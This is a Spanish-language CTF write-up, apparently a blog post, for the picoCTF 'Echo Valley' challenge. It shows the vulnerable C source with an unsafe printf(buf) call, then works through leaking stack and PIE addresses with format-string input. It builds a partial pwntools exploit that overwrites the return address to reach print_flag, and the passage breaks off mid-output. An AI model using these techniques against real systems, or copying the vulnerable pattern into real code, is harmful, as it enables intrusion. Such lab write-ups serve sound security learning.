class="breadcrumb-item active" aria-current=page>Echo Valley</li></ol></nav><div style=display:flex;align-items:center><h1 style=margin:0;vertical-align:middle>Echo Valley</h1></div><nav class="toc-mobile d-xl-none" aria-label="Quaternary navigation"></nav><div style=display:flex;align-items:center;vertical-align:middle><img src=/blog/phishing/images/picoctf.png alt style=width:40px;height:40px;margin-right:10px;vertical-align:middle></div><br><p><small>July 18, 2025<span class="stretched-link position-relative reading-time" title="Estimated reading time"><svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z" fill="none"/><path d="M3 12a9 9 0 1018 0A9 9 0 003 12"/><path d="M12 7v5l3 3"/></svg>8&nbsp;minutes</span></small></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdlib.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
</span></span></span><span class=line><span class=cl><span class=cp></span>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>print_flag</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span>
</span></span><span class=line><span class=cl>    <span class=n>FILE</span> <span class=o>*</span><span class=n>file</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>(</span><span class=s>&#34;/home/valley/flag.txt&#34;</span><span class=p>,</span> <span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>(</span><span class=n>file</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;Failed to open flag file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=nf>exit</span><span class=p>(</span><span class=n>EXIT_FAILURE</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Congrats! Here is your flag: %s&#34;</span><span class=p>,</span> <span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>fclose</span><span class=p>(</span><span class=n>file</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>exit</span><span class=p>(</span><span class=n>EXIT_SUCCESS</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>void</span> <span class=nf>echo_valley</span><span class=p>()</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Welcome to the Echo Valley, Try Shouting: </span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=kt>char</span> <span class=n>buf</span><span class=p>[</span><span class=mi>100</span><span class=p>];</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>while</span><span class=p>(</span><span class=mi>1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>fgets</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>),</span> <span class=n>stdin</span><span class=p>)</span> <span class=o>==</span> <span class=nb>NULL</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;</span><span class=se>\n</span><span class=s>EOF detected. Exiting...</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>exit</span><span class=p>(</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=nf>strcmp</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=s>&#34;exit</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>)</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;The Valley Disappears</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;You heard in the distance: &#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=nf>fflush</span><span class=p>(</span><span class=n>stdout</span><span class=p>);</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=nf>main</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>echo_valley</span><span class=p>();</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>En la función main se llama a la función echo_valley, dentro de la función echo valley se pide un input y después lo muestra con un printf, todo esto dentro de un bucle infinito, el cual solo se detiene si el input es &ldquo;exit&rdquo;.</p><p>Cuando el programa devuelve el input introducido lo hace con printf sin especificar el tipo, haciéndolo vulnerable a format strings</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=nf>printf</span><span class=p>(</span><span class=n>buf</span><span class=p>);</span>
</span></span></code></pre></div><p>Esto permite lekear información del stack y hasta llegar a escribir en direcciones de la memoria.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./valley
</span></span><span class=line><span class=cl>Welcome to the Echo Valley, Try Shouting:
</span></span><span class=line><span class=cl>hola
</span></span><span class=line><span class=cl>You heard in the distance: hola
</span></span><span class=line><span class=cl>%p
</span></span><span class=line><span class=cl>You heard in the distance: 0x7fff00fae700
</span></span></code></pre></div><p>Hay una función llamada print_flag que básicamente muestra la flag, así que el objetivo va a ser saltar a esa función mediante format strings.</p><p>Para explotar format strings lo primero es saber en qué posición se almacena el input</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ ./valley
</span></span><span class=line><span class=cl>Welcome to the Echo Valley, Try Shouting:
</span></span><span class=line><span class=cl>AAAAAAAA %p %p %p %p %p %p %p %p
</span></span><span class=line><span class=cl>You heard in the distance: AAAAAAAA 0x7ffcc3d13790 <span class=o>(</span>nil<span class=o>)</span> <span class=o>(</span>nil<span class=o>)</span> <span class=o>(</span>nil<span class=o>)</span> 0x7fb732a03ea0 0x4141414141414141 0x2520702520702520 0x2070252070252070
</span></span></code></pre></div><p>La cuarta dirección lekeada es <code>0x4141414141414141</code> que básicamente son las A que se han introducido al principio del input</p><pre tabindex=0><code>$ pwn unhex 4141414141414141
AAAAAAAA
</code></pre><p>Así que la posición donde se guarda el input es la cuarta.</p><hr><p>Revisando las protecciones del binario me di cuenta de que están todas habilitadas</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; checksec
</span></span><span class=line><span class=cl>File:     /home/d3bo/Desktop/ctf/pico/echo_valley/valley
</span></span><span class=line><span class=cl>Arch:     amd64
</span></span><span class=line><span class=cl>RELRO:      Full RELRO
</span></span><span class=line><span class=cl>Stack:      Canary found
</span></span><span class=line><span class=cl>NX:         NX enabled
</span></span><span class=line><span class=cl>PIE:        PIE enabled
</span></span><span class=line><span class=cl>SHSTK:      Enabled
</span></span><span class=line><span class=cl>IBT:        Enabled
</span></span></code></pre></div><p>El PIE va a molestar un poco, ya que lo que hace es aleatorizar las direcciones del binario, haciendo que las direcciones cambien en cada ejecución.</p><p>Así que hay que saber la base de PIE para después sumarle el offset de la dirección de print_flag</p><pre tabindex=0><code>Dump of assembler code for function print_flag:
   0x0000000000001269 &lt;+0&gt;:	endbr64
</code></pre><p>GDB para poder debuggear mejor siempre usa la misma base de PIE, se puede consultar con el comando piebase</p><pre tabindex=0><code>pwndbg&gt; piebase
Calculated VA from /home/d3bo/Desktop/ctf/pico/echo_valley/valley = 0x555555554000
</code></pre><p>Pero claro, el exploit hay que ejecutarlo en remoto y en remoto no se puede usar esto, entonces para conocer la base de PIE se necesita lekear una dirección del binario, recomiendo hacerlo con gdb porque como la base es 0x555555554000 se pueden identificar rápidamente, ya que empiezan por 55555&mldr;</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; c
</span></span><span class=line><span class=cl>Continuing.
</span></span><span class=line><span class=cl>Welcome to the Echo Valley, Try Shouting:
</span></span><span class=line><span class=cl>%p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p %p
</span></span><span class=line><span class=cl>You heard in the distance: 0x7fffffffe430 <span class=o>(</span>nil<span class=o>)</span> <span class=o>(</span>nil<span class=o>)</span> <span class=o>(</span>nil<span class=o>)</span> 0x7ffff7f97ea0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x207025 0xa4e6cbacc877fc00 0x7fffffffe660 0x555555555413 0x7fffffffe700 0x7ffff7dda6b5 0x7ffff7fc6000 0x7fffffffe788 0x1ffffe6c0 0x555555555401 <span class=o>(</span>nil<span class=o>)</span> 0xf6452c3f3714abec 0x7fffffffe788 0x1 0x7ffff7ffd000 0x555555557d78 You heard in the distance: 0x7fffffffe430 <span class=o>(</span>nil<span class=o>)</span> <span class=o>(</span>nil<span class=o>)</span> <span class=o>(</span>nil<span class=o>)</span> 0x7ffff7f97ea0 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x252070000a702520 0x2070252070252070 0x7025207025207025
</span></span></code></pre></div><p>En la posición 21 hay esta dirección</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>0x555555555413
</span></span></code></pre></div><p>Al restarle la base de PIE se obtiene el offset de la instrucción a la que apunta</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=o>&gt;&gt;&gt;</span> <span class=nb>hex</span><span class=p>(</span><span class=mh>0x555555555413</span> <span class=o>-</span> <span class=mh>0x555555554000</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=s1>&#39;0x1413&#39;</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; disass 0x1413
</span></span><span class=line><span class=cl>Dump of assembler code <span class=k>for</span> <span class=k>function</span> main:
</span></span><span class=line><span class=cl>   0x0000000000001401 &lt;+0&gt;:	endbr64
</span></span><span class=line><span class=cl>   0x0000000000001405 &lt;+4&gt;:	push   rbp
</span></span><span class=line><span class=cl>   0x0000000000001406 &lt;+5&gt;:	mov    rbp,rsp
</span></span><span class=line><span class=cl>   0x0000000000001409 &lt;+8&gt;:	mov    eax,0x0
</span></span><span class=line><span class=cl>   0x000000000000140e &lt;+13&gt;:	call   0x1307 &lt;echo_valley&gt;
</span></span><span class=line><span class=cl>   0x0000000000001413 &lt;+18&gt;:	mov    eax,0x0
</span></span><span class=line><span class=cl>   0x0000000000001418 &lt;+23&gt;:	pop    rbp
</span></span><span class=line><span class=cl>   0x0000000000001419 &lt;+24&gt;:	ret
</span></span></code></pre></div><p>Parece que apunta a main +18 justo la línea que hay después del call a echo_valley, parece que lo que se a encontrado es la dirección de retorno guardada, básicamente la dirección a la cual va a saltar el programa después de ejecutar la función echo_valley.</p><p>El objetivo ahora es hacer un script que consiga esa dirección y le reste el offset (0x1413) para obtener la base del PIE</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-py data-lang=py><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>exe</span> <span class=o>=</span> <span class=n>ELF</span><span class=p>(</span><span class=s2>&#34;./valley_patched&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>binary</span> <span class=o>=</span> <span class=n>exe</span>
</span></span><span class=line><span class=cl><span class=n>context</span><span class=o>.</span><span class=n>terminal</span> <span class=o>=</span> <span class=p>[</span><span class=s1>&#39;tmux&#39;</span><span class=p>,</span> <span class=s1>&#39;splitw&#39;</span><span class=p>,</span> <span class=s1>&#39;-h&#39;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=n>gdb_script</span> <span class=o>=</span> <span class=s1>&#39;&#39;&#39;
</span></span></span><span class=line><span class=cl><span class=s1>b main
</span></span></span><span class=line><span class=cl><span class=s1>continue
</span></span></span><span class=line><span class=cl><span class=s1>&#39;&#39;&#39;</span>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>conn</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>LOCAL</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>process</span><span class=p>([</span><span class=n>exe</span><span class=o>.</span><span class=n>path</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>args</span><span class=o>.</span><span class=n>GDB</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>gdb</span><span class=o>.</span><span class=n>attach</span><span class=p>(</span><span class=n>r</span><span class=p>,</span> <span class=n>gdbscript</span><span class=o>=</span><span class=n>gdb_script</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>r</span> <span class=o>=</span> <span class=n>remote</span><span class=p>(</span><span class=s2>&#34;shape-facility.picoctf.net&#34;</span><span class=p>,</span> <span class=mi>51749</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>r</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>main</span><span class=p>():</span>
</span></span><span class=line><span class=cl>    <span class=n>r</span> <span class=o>=</span> <span class=n>conn</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>offset_fmstr</span> <span class=o>=</span> <span class=mi>6</span>
</span></span><span class=line><span class=cl>    <span class=n>offset_main_addr</span> <span class=o>=</span> <span class=mh>0x1413</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=s1>&#39;Shouting:&#39;</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;%21$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>output</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;You heard in the distance: &#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>output</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Leaked address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>output</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>pie_base</span> <span class=o>=</span> <span class=n>output</span> <span class=o>-</span> <span class=n>offset_main_addr</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Pie base: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>pie_base</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>main</span><span class=p>()</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>d3bo@archlinux echo_valley<span class=o>]</span>$ python3 solve.py LOCAL
</span></span><span class=line><span class=cl>Leaked address: 0x55d241f6f413
</span></span><span class=line><span class=cl>Pie base: 0x55d241f6e000
</span></span><span class=line><span class=cl><span class=o>[</span>*<span class=o>]</span> Switching to interactive mode
</span></span><span class=line><span class=cl>$
</span></span></code></pre></div><p>Una vez con la base de PIE ya se puede calcular la dirección de print_flag, básicamente es sumar el offset a PIE base</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; disass print_flag
</span></span><span class=line><span class=cl>Dump of assembler code <span class=k>for</span> <span class=k>function</span> print_flag:
</span></span><span class=line><span class=cl>   0x0000000000001269 &lt;+0&gt;:	endbr64
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=o>....</span>
</span></span><span class=line><span class=cl>    <span class=n>offset_print_flag</span> <span class=o>=</span> <span class=mh>0x0000000000001269</span>
</span></span><span class=line><span class=cl>    <span class=n>print_flag</span> <span class=o>=</span> <span class=n>pie_base</span> <span class=o>+</span> <span class=n>offset_print_flag</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Print flag: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>print_flag</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=o>....</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=o>[</span>d3bo@archlinux echo_valley<span class=o>]</span>$ python3 solve.py LOCAL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Leaked address: 0x561d8943a413
</span></span><span class=line><span class=cl>Pie base: 0x561d89439000
</span></span><span class=line><span class=cl>Print flag: 0x561d8943a269
</span></span></code></pre></div><p>Ahora solo queda sustituir la dirección de retorno que va a main+18 por la de print_flag.</p><p>No basta solo con saber que esa dirección de retorno se almacena en la posición 21, hay que saber la dirección exacta de donde está en el stack, pero claro, las direcciones en el stack cambian en cada ejecución, así que hay que lekear una dirección del stack.</p><p>Antes al dumpear con %p los valores del stack, antes del return address, concretamente en la dirección 20 había esta dirección <code>0x7fffffffe660</code> la cual parece ser del stack, para comprobarlo abrí gdb, puse un breakpoint a echo_valley, ejecute el programa y con telescope consulte el stack</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>pwndbg&gt; telescope <span class=nv>$rsp</span> <span class=m>30</span>
</span></span><span class=line><span class=cl>00:0000│ rsp 0x7fffffffe5e0 ◂— 0xa7024303225 /* <span class=s1>&#39;%20$p\n&#39;</span> */
</span></span><span class=line><span class=cl>01:0008│-068 0x7fffffffe5e8 ◂— 0x4a0000
</span></span><span class=line><span class=cl>02:0010│-060 0x7fffffffe5f0 ◂— 0x800
</span></span><span class=line><span class=cl>03:0018│-058 0x7fffffffe5f8 ◂— 0x940000
</span></span><span class=line><span class=cl>04:0020│-050 0x7fffffffe600 ◂— 0x940000
</span></span><span class=line><span class=cl>05:0028│-048 0x7fffffffe608 —▸ 0x7fffffffe638 ◂— <span class=m>0</span>
</span></span><span class=line><span class=cl>06:0030│-040 0x7fffffffe610 ◂— 0x8c00000006
</span></span><span class=line><span class=cl>07:0038│-038 0x7fffffffe618 ◂— <span class=m>0</span>
</span></span><span class=line><span class=cl>... ↓        <span class=m>5</span> skipped
</span></span><span class=line><span class=cl>0d:0068│-008 0x7fffffffe648 ◂— 0x7ee53e6c33167700
</span></span><span class=line><span class=cl>0e:0070│ rbp 0x7fffffffe650 —▸ 0x7fffffffe660 —▸ 0x7fffffffe700 —▸ 0x7fffffffe760 ◂— <span class=m>0</span>
</span></span><span class=line><span class=cl>0f:0078│+008 0x7fffffffe658 —▸ 0x555555555413 <span class=o>(</span>main+18<span class=o>)</span> ◂— mov eax, <span class=m>0</span>
</span></span><span class=line><span class=cl>10:0080│+010 0x7fffffffe660 —▸ 0x7fffffffe700 —▸ 0x7fffffffe760 ◂— <span class=m>0</span>
</span></span><span class=line><span class=cl>11:0088│+018 0x7fffffffe668 —▸ 0x7ffff7dda6b5 <span class=o>(</span>__libc_start_call_main+117<span class=o>)</span> ◂— mov edi, eax
</span></span><span class=line><span class=cl>12:0090│+020 0x7fffffffe670 —▸ 0x7ffff7fc6000 ◂— 0x3010102464c457f
</span></span><span class=line><span class=cl>13:0098│+028 0x7fffffffe678 —▸ 0x7fffffffe788 —▸ 0x7fffffffea8e ◂— <span class=s1>&#39;/home/d3bo/Desktop/ctf/pico/echo_valley/valley&#39;</span>
</span></span><span class=line><span class=cl>14:00a0│+030 0x7fffffffe680 ◂— 0x1ffffe6c0
</span></span><span class=line><span class=cl>15:00a8│+038 0x7fffffffe688 —▸ 0x555555555401 <span class=o>(</span>main<span class=o>)</span> ◂— endbr64
</span></span><span class=line><span class=cl>16:00b0│+040 0x7fffffffe690 ◂— <span class=m>0</span>
</span></span><span class=line><span class=cl>17:00b8│+048 0x7fffffffe698 ◂— 0x20ab65b3ad9a780b
</span></span><span class=line><span class=cl>18:00c0│+050 0x7fffffffe6a0 —▸ 0x7fffffffe788 —▸ 0x7fffffffea8e ◂— <span class=s1>&#39;/home/d3bo/Desktop/ctf/pico/echo_valley/valley&#39;</span>
</span></span><span class=line><span class=cl>19:00c8│+058 0x7fffffffe6a8 ◂— <span class=m>1</span>
</span></span><span class=line><span class=cl>1a:00d0│+060 0x7fffffffe6b0 —▸ 0x7ffff7ffd000 <span class=o>(</span>_rtld_global<span class=o>)</span> —▸ 0x7ffff7ffe310 —▸ 0x555555554000 ◂— 0x10102464c457f
</span></span><span class=line><span class=cl>1b:00d8│+068 0x7fffffffe6b8 —▸ 0x555555557d78 <span class=o>(</span>__do_global_dtors_aux_fini_array_entry<span class=o>)</span> —▸ 0x555555555220 <span class=o>(</span>__do_global_dtors_aux<span class=o>)</span> ◂— endbr64
</span></span><span class=line><span class=cl>1c:00e0│+070 0x7fffffffe6c0 ◂— 0x20ab65b3af7a780b
</span></span><span class=line><span class=cl>1d:00e8│+078 0x7fffffffe6c8 ◂— 0x20ab75f72f44780b
</span></span></code></pre></div><p>Fuera del stack frame actual de la función echo_valley, en la dirección <code>0x7fffffffe658</code> es donde está guardado el return address y justo la dirección que mostraba al hacer %20$p es la siguiente dirección del stack <code>0x7fffffffe660</code>.</p><pre tabindex=0><code>&gt;&gt;&gt; 0x7fffffffe660 - 0x7fffffffe658
8
</code></pre><p>La diferencia entre la una y la otra es solo 8, ya que van seguidas, así que para saber la dirección del stack en la que se almacena el return address basta con restarle 8 a la dirección lekeada de %20$p</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;%20$p&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>r</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=n>output</span><span class=o>.</span><span class=n>split</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;You heard in the distance: &#39;</span><span class=p>)[</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>output</span> <span class=o>=</span> <span class=nb>int</span><span class=p>(</span><span class=n>output</span><span class=p>,</span> <span class=mi>16</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Leaked address: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>output</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>ret_addr</span> <span class=o>=</span> <span class=n>output</span> <span class=o>-</span> <span class=mi>8</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;Ret addr: </span><span class=si>{</span><span class=nb>hex</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span></code></pre></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>$ python3 solve.py LOCAL
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Leaked address: 0x5584893f4413
</span></span><span class=line><span class=cl>Pie base: 0x5584893f3000
</span></span><span class=line><span class=cl>Print flag: 0x5584893f4269
</span></span><span class=line><span class=cl>Leaked address: 0x7ffcbdffb040
</span></span><span class=line><span class=cl>Ret addr: 0x7ffcbdffb038
</span></span></code></pre></div><p>Solo queda craftear el payload final para sustituir la dirección de retorno a main por la que va a print_flag.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=p>{</span><span class=n>ret_addr</span><span class=p>:</span> <span class=n>print_flag</span><span class=p>})</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;exit&#39;</span><span class=p>)</span>
</span></span></code></pre></div><p>Esto debería de funcionar, ¿pero no funciona, porque?</p><p>El programa lee un input de maximo 100 bytes y el payload generado por pwntools para cambiar el valor del return address ocupa 120.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl>    <span class=n>payload</span> <span class=o>=</span> <span class=n>fmtstr_payload</span><span class=p>(</span><span class=mi>6</span><span class=p>,</span> <span class=p>{</span><span class=n>ret_addr</span><span class=p>:</span> <span class=n>print_flag</span><span class=p>})</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=nb>len</span><span class=p>(</span><span class=n>payload</span><span class=p>))</span>
</span></span></code></pre></div><pre tabindex=0><code>$ python3 solve.py LOCAL

Leaked address: 0x55e196f92413
Pie base: 0x55e196f91000
Print flag: 0x55e196f92269
Leaked address: 0x7ffc4c7c0670
